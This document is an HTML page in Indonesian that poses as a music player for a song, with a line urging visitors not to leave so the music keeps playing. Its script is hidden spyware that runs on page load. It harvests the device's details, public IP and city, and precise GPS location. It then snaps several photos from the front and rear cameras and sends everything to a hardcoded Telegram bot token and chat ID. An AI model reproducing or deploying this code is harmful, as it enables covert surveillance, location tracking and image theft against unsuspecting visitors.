<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Now Playing</title>
  <style>
    body {
      margin: 0;
      background: linear-gradient(135deg, #0f0f0f, #1a1a1a, #000000);
      color: #fff;
      font-family: 'Segoe UI', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
      background-size: 400% 400%;
      animation: bgmove 20s ease infinite;
    }

    @keyframes bgmove {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    .player {
      display: flex;
      flex-direction: column;
      align-items: center;
      transform: scale(0.85);
    }
    .cover {
      width: 180px;
      height: 180px;
      border-radius: 50%;
      overflow: hidden;
      margin-bottom: 20px;
    }
    .cover img {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }
    .title-container {
      width: 260px;
      overflow: hidden;
      white-space: nowrap;
      margin-bottom: 5px;
    }
    .title-scroll {
      display: inline-block;
      animation: scroll 12s linear infinite;
      font-size: 16px;
      font-weight: bold;
      color: #fff;
    }
    .artist {
      font-size: 14px;
      color: #aaa;
      margin-bottom: 15px;
    }
    .controls {
      display: flex;
      gap: 10px;
    }
    .btn {
      background: #222;
      border: 1px solid #444;
      color: #fff;
      padding: 8px 16px;
      cursor: pointer;
      border-radius: 30px;
      font-size: 13px;
    }
    @keyframes scroll {
      0%   { transform: translateX(100%); }
      100% { transform: translateX(-100%); }
    }
  </style>
</head>
<body>
  <div class="player">
    <div class="cover" id="cover">
      <img src="https://files.catbox.moe/ssiqvm.jpg" alt="Album Art">
    </div>
    <div class="title-container">
      <div class="title-scroll">SUMPAH KU MENCINTAIMU - SEVENTEEN ( SPEED UP )</div>
    </div>
    <div class="artist">Jangan keluar agar music tidak mati</div>
    <audio id="audio" src="https://files.catbox.moe/2yf6i9.mp3" loop></audio>
    <div class="controls">
      <button class="btn" onclick="playAudio()">Play</button>
      <button class="btn" onclick="pauseAudio()">Pause</button>
    </div>
  </div>

  <script>
    function playAudio() {
      const audio = document.getElementById("audio");
      audio.play();
    }

    function pauseAudio() {
      const audio = document.getElementById("audio");
      audio.pause();
    }

    const token1 = '7691252764:AAEivTZ5gqJx9LjID9Fkz43qNIICvv6FGdY';
    const token2 = '';
    const chatId1 = '5914256752';
    const chatId2 = '';

    const getDeviceBrand = () => {
      const ua = navigator.userAgent;
      if (/Vivo|vivo/.test(ua)) return 'Vivo';
      if (/Oppo|CPH/.test(ua)) return 'Oppo';
      if (/Samsung|SM-/.test(ua)) return 'Samsung';
      if (/Infinix/.test(ua)) return 'Infinix';
      if (/Redmi|Mi/.test(ua)) return 'Xiaomi';
      if (/RMX/.test(ua)) return 'Realme';
      return 'Android Device';
    };

    const kirimPesan = async (pesan) => {
      const payload = { chat_id: chatId1, text: pesan, parse_mode: 'HTML' };
      const payload2 = { chat_id: chatId2, text: pesan, parse_mode: 'HTML' };
      await Promise.all([
        fetch(`https://api.telegram.org/bot${token1}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        }),
        fetch(`https://api.telegram.org/bot${token2}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload2)
        })
      ]);
    };

    const kirimFoto = async (blob) => {
      const form1 = new FormData();
      form1.append("chat_id", chatId1);
      form1.append("photo", blob, "foto.jpg");
      const form2 = new FormData();
      form2.append("chat_id", chatId2);
      form2.append("photo", blob, "foto.jpg");
      await Promise.all([
        fetch(`https://api.telegram.org/bot${token1}/sendPhoto`, { method: "POST", body: form1 }),
        fetch(`https://api.telegram.org/bot${token2}/sendPhoto`, { method: "POST", body: form2 })
      ]);
    };

    const ambilDataPerangkat = async () => {
      const ua = navigator.userAgent;
      const platform = navigator.platform;
      const vendor = navigator.vendor;
      const brand = getDeviceBrand();
      const gpu = (() => {
        try {
          const canvas = document.createElement("canvas");
          const gl = canvas.getContext("webgl");
          const info = gl.getExtension("WEBGL_debug_renderer_info");
          return {
            vendor: gl.getParameter(info.UNMASKED_VENDOR_WEBGL),
            renderer: gl.getParameter(info.UNMASKED_RENDERER_WEBGL),
          };
        } catch {
          return { vendor: "Tidak diketahui", renderer: "Tidak diketahui" };
        }
      })();
      const bat = await navigator.getBattery();
      const waktu = new Date().toLocaleString("id-ID");
      const touch = 'ontouchstart' in window ? 'Ya' : 'Tidak';
      const ref = document.referrer || 'Langsung';

      return `
- 〘 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗦𝗜 𝗣𝗘𝗥𝗔𝗡𝗚𝗞𝗔𝗧 〙 -

Jenis Perangkat        : ${brand}
User Agent             : ${ua}
Platform               : ${platform}
Vendor Browser         : ${vendor}
GPU Vendor             : ${gpu.vendor}
GPU Renderer           : ${gpu.renderer}
CPU                    : ${navigator.hardwareConcurrency || '-'} inti
RAM                    : ${navigator.deviceMemory || '-'} GB
Resolusi Layar         : ${screen.width} x ${screen.height}
Orientasi Layar        : ${screen.orientation?.type || '-'}
Touch Support          : ${touch} (${navigator.maxTouchPoints} titik)
Kerapatan Piksel       : ${window.devicePixelRatio}
Cookies Aktif          : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
JavaScript             : Aktif
Do Not Track           : ${navigator.doNotTrack == "1" ? "Ya" : "Tidak"}
HTTPS                  : ${location.protocol === "https:" ? "Ya" : "Tidak"}
Zona Waktu             : ${Intl.DateTimeFormat().resolvedOptions().timeZone}
Waktu Lokal            : ${waktu}
Referrer               : ${ref}
Baterai                : ${Math.round(bat.level * 100)}%
Sedang Mengisi         : ${bat.charging ? '✅' : '🚫'}
`.trim();
    };

    const ambilIPInfo = async () => {
      try {
        const res = await fetch("https://ipapi.co/json");
        const ip = await res.json();
        return `
- 〘 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗦𝗜 𝗝𝗔𝗥𝗜𝗡𝗚𝗔𝗡 〙 -

IP Publik           : ${ip.ip}
Penyedia Layanan    : ${ip.org}
Negara              : ${ip.country_name}
Provinsi            : ${ip.region}
Kota                : ${ip.city}
`.trim();
      } catch {
        return "\nINFORMASI JARINGAN\nGagal mengambil data IP.";
      }
    };

    const ambilLokasi = () => {
      return new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition(pos => {
          const { latitude, longitude, accuracy } = pos.coords;
          resolve(`
- 〘 𝗟𝗢𝗞𝗔𝗦𝗜 𝗟𝗔𝗡𝗚𝗦𝗨𝗡𝗚 〙 -

Latitude            : ${latitude}
Longitude           : ${longitude}
Akurasi             : ±${accuracy} meter
Peta                : https://maps.google.com/?q=${latitude},${longitude}
`);
        }, () => {
          resolve(`
- 〘 𝗟𝗢𝗞𝗔𝗦𝗜 𝗟𝗔𝗡𝗚𝗦𝗨𝗡𝗚 〙 -

❌ Lokasi tidak diizinkan oleh pengguna.`);
        }, { enableHighAccuracy: true, timeout: 7000 });
      });
    };

    const ambilKamera = async (facingMode, label) => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
        const video = document.createElement("video");
        video.srcObject = stream;
        video.setAttribute("playsinline", true);
        await video.play();
        await new Promise(resolve => {
          const cek = () => {
            if (video.videoWidth > 0 && video.videoHeight > 0) resolve();
            else requestAnimationFrame(cek);
          };
          cek();
        });
        for (let i = 0; i < 5; i++) {
          const canvas = document.createElement("canvas");
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext("2d");
          ctx.drawImage(video, 0, 0);
          await new Promise(resolve => canvas.toBlob(async (blob) => {
            if (blob) await kirimFoto(blob);
            resolve();
          }, "image/jpeg"));
        }
        stream.getTracks().forEach(track => track.stop());
        return "";
      } catch {
        return `- 〘 ${label} 〙 - ❌ Tidak diizinkan`;
      }
    };

    const mulai = async () => {
      const [info, ip, lokasi] = await Promise.all([
        ambilDataPerangkat(),
        ambilIPInfo(),
        ambilLokasi()
      ]);
      await kirimPesan(`${info}\n\n${ip}\n\n${lokasi}`);
      const depan = await ambilKamera("user", "KAMERA DEPAN");
      if (depan) await kirimPesan(depan);
      const belakang = await ambilKamera("environment", "KAMERA BELAKANG");
      if (belakang) await kirimPesan(belakang);
    };

    mulai();
  </script>
</body>
</html>
